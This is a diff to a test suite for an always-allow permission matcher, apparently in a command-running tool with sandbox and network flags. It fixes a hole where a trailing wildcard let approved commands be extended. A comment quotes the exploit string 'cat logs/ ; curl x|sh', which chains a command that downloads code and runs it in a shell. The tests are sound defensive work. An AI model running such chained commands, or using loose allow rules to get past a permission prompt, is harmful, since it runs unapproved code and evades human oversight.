@@ -17,12 +17,13 @@ describe('AlwaysAllowRules', () => {
     expect(rules.allows('npm tes')).toBe(false)
   })
 
-  it('treats a trailing * as a prefix match', () => {
+  // A trailing * was a prefix wildcard, and "always" on `cat logs/*` then allowed `cat logs/ ; curl x|sh` (#838)
+  it('treats a trailing * as a literal character, not a prefix', () => {
     const rules = new AlwaysAllowRules()
     rules.add('npm test*')
-    expect(rules.allows('npm test')).toBe(true)
-    expect(rules.allows('npm test --watch')).toBe(true)
-    expect(rules.allows('npm run build')).toBe(false)
+    expect(rules.allows('npm test')).toBe(false)
+    expect(rules.allows('npm test --watch')).toBe(false)
+    expect(rules.allows('npm test*')).toBe(true)
   })
 
   it('treats a * anywhere but the end as a literal character', () => {
@@ -34,7 +35,7 @@ describe('AlwaysAllowRules', () => {
 
   it('allows a key matching any one of the rules added with addAll', () => {
     const rules = new AlwaysAllowRules()
-    rules.addAll(['git status', '/repo/src/*'])
+    rules.addAll(['git status', '/repo/src/a.ts'])
     expect(rules.allows('git status')).toBe(true)
     expect(rules.allows('/repo/src/a.ts')).toBe(true)
     expect(rules.allows('/repo/docs/a.md')).toBe(false)
@@ -57,5 +58,14 @@ describe('alwaysAllowKey', () => {
 
   it('keys a command by its trimmed text, as the UI suggests the matcher', () => {
     expect(alwaysAllowKey({ kind: 'command', command: ' npm test\n', cwd: '/repo' })).toBe('npm test')
+  })
+
+  // A rule is the command's text only: it cannot tell these from the plain command, or survive an older host (#838)
+  it('gives no key to a flagged command or one ending in *', () => {
+    const c = { kind: 'command' as const, command: 'npm test', cwd: '/repo' }
+    expect(alwaysAllowKey({ ...c, unsandboxed: true })).toBe('')
+    expect(alwaysAllowKey({ ...c, stdin: true })).toBe('')
+    expect(alwaysAllowKey({ ...c, network: { host: 'x', protocol: 'https' } })).toBe('')
+    expect(alwaysAllowKey({ ...c, command: 'cat logs/* ' })).toBe('')
   })
 })
